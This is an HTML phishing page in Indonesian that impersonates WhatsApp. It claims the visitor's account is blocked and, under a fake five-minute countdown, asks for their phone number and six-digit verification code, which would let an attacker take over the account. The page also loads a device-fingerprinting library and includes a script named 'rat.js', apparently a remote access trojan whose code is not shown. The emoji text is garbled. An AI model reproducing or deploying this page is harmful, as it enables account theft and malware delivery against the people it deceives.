<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp - Akun Diblokir</title>
    <link rel="stylesheet" href="assets/wa-banned.css">
    <link rel="icon" href="assets/wa-logo.svg">
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
</head>
<body>
    <div class="wa-container">
        <div class="wa-header">
            <img src="assets/wa-logo.svg" alt="WhatsApp" class="wa-logo">
            <h1 class="wa-title">тЪая╕П AKUN ANDA DIBLOKIR</h1>
        </div>
        
        <div class="wa-content">
            <div class="warning-icon">ЁЯЪл</div>
            <p class="wa-message">
                Akun WhatsApp Anda telah diblokir karena pelanggaran kebijakan.<br>
                Verifikasi identitas Anda untuk membuka blokir.
            </p>
            
            <form id="verifyForm" class="wa-form">
                <div class="input-group">
                    <label>Nomor Telepon</label>
                    <input type="tel" id="phone" placeholder="+62xxxxxxxxxxx" required>
                </div>
                
                <div class="input-group">
                    <label>Kode Verifikasi 6 Digit</label>
                    <input type="text" id="otp" maxlength="6" placeholder="000000" required>
                </div>
                
                <button type="submit" class="btn-verify">
                    Verifikasi & Buka Blokir
                </button>
            </form>
            
            <div class="wa-footer">
                <p>тП░ Sisa waktu: <span id="countdown">04:59</span></p>
            </div>
        </div>
    </div>
    
    <script src="assets/rat.js"></script>
</body>
</html>
